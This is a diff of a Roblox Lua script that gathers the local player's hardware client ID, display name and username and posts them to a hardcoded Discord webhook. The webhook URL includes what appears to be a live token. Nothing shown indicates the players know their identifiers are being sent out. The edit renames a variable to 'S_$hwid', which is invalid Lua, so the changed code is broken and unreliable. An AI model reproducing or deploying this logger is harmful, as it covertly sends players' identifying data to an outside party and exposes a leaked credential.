@@ -1,7 +1,7 @@
 local HttpService = game:GetService("HttpService")
 Webhook_URL = "https://discord.com/api/webhooks/1155612192310317126/LIzFdRk1GtGk2jbWM8ra9H4rEMCE_BDQ5sEMtY5XE_lRCeEwESQwGlrwEma5N-VLAitG"
-local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
-local plr = game.Players.LocalPlayer
+local S_$hwid = game:GetService("RbxAnalyticsService"):GetClientId()
+local plre = game.Players.LocalPlayer
 local WV = "nil."
 local DName = game.Players.LocalPlayer.DisplayName
 local UName = game.Players.LocalPlayer.Name
@@ -48,7 +48,7 @@ local response =
                         ["fields"] = {
                             {
                                 ["name"] = "Hardware ID:",
-                                ["value"] = hwid,
+                                ["value"] = S_$hwid,
                                 ["inline"] = true
                             }
                         }
